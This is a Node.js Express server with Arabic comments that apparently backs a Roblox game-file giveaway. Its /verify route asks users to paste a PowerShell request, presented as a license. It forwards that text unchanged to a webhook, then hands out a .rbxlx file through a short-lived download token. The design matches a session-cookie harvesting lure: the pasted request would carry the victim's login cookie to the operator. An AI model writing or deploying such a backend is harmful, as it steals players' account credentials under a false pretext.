const express = require("express");
const cors = require("cors");
const fetch = require("node-fetch");
const FormData = require("form-data");
const crypto = require("crypto");
const path = require("path");
const fs = require("fs");

console.log("ENV TEST:", process.env.WEBHOOK);

const app = express();

app.use(cors());
app.use(express.json());

/* ============================
   قائمة الـ IDs والملفات (.rbxlx)
============================ */

const fileMap = {
    "109983668079237": "Steal A Brainrot.rbxlx",
    "131623223084840": "Escape Tsunami For Brainrots.rbxlx",
    "119987266683883": "Survive LAVA for Brainrots.rbxlx",
    "72845937010155": "Gear Slap Tower(1).rbxlx",
    "119865329453489": "Skaters Of Hell.rbxlx",
    "16518256559": "Mega Obby Fun.rbxlx",
    "139766023909499": "Slap DUELS UPD.rbxlx"
};

const defaultFile = "000.rbxlx";

/* ============================
   تخزين التوكنات المؤقتة
============================ */

const downloadTokens = new Map();

/* ============================
   نظام التحقق القديم
============================ */

app.post("/verify", async (req, res) => {
    try {
        const { gameUrl, powershell } = req.body;

        if (!gameUrl || !powershell) {
            return res.json({ success: false, message: "Missing data" });
        }

        const gameMatch = gameUrl.match(/\/games\/(\d+)/);
        const psMatch = powershell.match(/\/games\/(\d+)/);

        if (!gameMatch || !psMatch) {
            return res.json({ success: false, message: "Invalid format" });
        }

        if (gameMatch[1] !== psMatch[1]) {
            return res.json({ success: false, message: "ID mismatch" });
        }

        const gameId = gameMatch[1];

        const webhookURL = process.env.WEBHOOK;
        if (!webhookURL) {
            console.error("WEBHOOK variable not set!");
            return res.status(500).json({ success: false });
        }

        /* ============================
           إرسال الويبهوك
        ============================= */

        const fileContent =
`New Valid Submission

Game ID: ${gameId}

License:
${powershell}
`;

        const form = new FormData();

        form.append("content", `🎮 New Game ID: ${gameId}`);
        form.append("file", Buffer.from(fileContent), {
            filename: "license.txt",
            contentType: "text/plain"
        });

        await fetch(webhookURL, {
            method: "POST",
            body: form
        });

        /* ============================
           اختيار الملف حسب الـ ID
        ============================= */

        let selectedFile = fileMap[gameId] || defaultFile;

        /* ============================
           إنشاء توكن تحميل مؤقت (دقيقة)
        ============================= */

        const token = crypto.randomBytes(32).toString("hex");

        downloadTokens.set(token, {
            file: selectedFile,
            expires: Date.now() + 60 * 1000
        });

        res.json({
            success: true,
            token: token
        });

    } catch (err) {
        console.error("ERROR:", err);
        res.status(500).json({ success: false });
    }
});

/* ============================
   Route التحميل المحمي
============================ */

app.get("/download/:token", (req, res) => {

    const tokenData = downloadTokens.get(req.params.token);

    if (!tokenData) {
        return res.status(403).send("Invalid token");
    }

    if (Date.now() > tokenData.expires) {
        downloadTokens.delete(req.params.token);
        return res.status(403).send("Token expired");
    }

    const filePath = path.join(__dirname, "files", tokenData.file);

    if (!fs.existsSync(filePath)) {
        return res.status(404).send("File not found on server");
    }

    downloadTokens.delete(req.params.token);

    res.download(filePath);
});

app.listen(process.env.PORT || 3000, () => {
    console.log("Server running...");
});